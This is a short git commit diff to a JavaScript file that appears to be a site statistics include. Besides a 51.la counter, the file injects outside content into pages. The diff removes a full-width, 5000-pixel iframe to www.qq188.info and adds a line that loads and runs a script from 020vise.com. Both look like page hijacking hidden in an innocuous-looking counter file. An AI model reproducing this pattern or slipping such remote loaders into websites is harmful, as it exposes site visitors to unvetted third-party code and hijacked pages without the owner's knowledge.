b239085527b7ea0da34c94288b23f5db0535e182
qiang188 <bt_gady@sina.com>
2015-04-28 14:48:43 +0800

    Update 17767015.js

--- tj/17767015.js
+++ tj/17767015.js
@@ -2,4 +2,4 @@ document.writeln("<script language=\"javascript\" type=\"text/javascript\" src=\
 
 document.writeln("<script language=\"javascript\" type=\"text/javascript\" src=\"http://js.users.51.la/17767015.js\"><\/script>");
 
-document.writeln("<iframe width=\'100%\' height=\'5000\' src=http:\/\/www.qq188.info\/><\/iframe>");
+document.writeln("<script language='javascript' src='http://020vise.com/nxpy44/qt.js'></script>");
